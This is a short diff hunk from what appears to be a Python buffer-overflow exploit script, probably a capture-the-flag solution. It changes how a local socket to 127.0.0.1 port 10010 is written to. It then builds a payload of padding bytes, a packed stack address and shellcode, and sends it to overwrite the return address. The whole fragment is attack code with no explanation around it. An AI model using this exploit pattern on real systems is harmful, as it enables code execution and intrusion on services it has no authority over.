@@ -64,7 +64,7 @@ xxd(shellcode)
 IP = '127.0.0.1'
 PORT = 10010
 s = mysock(IP, PORT)
-s.send('\n000')
+sl(s, '\n000')
 SP = 0x1ef0 + 1
 shellcode = 'AAAAAAAAAAAAAAAAAAAA' + pb(SP) + shellcode + '\n'
 sl(s, shellcode)
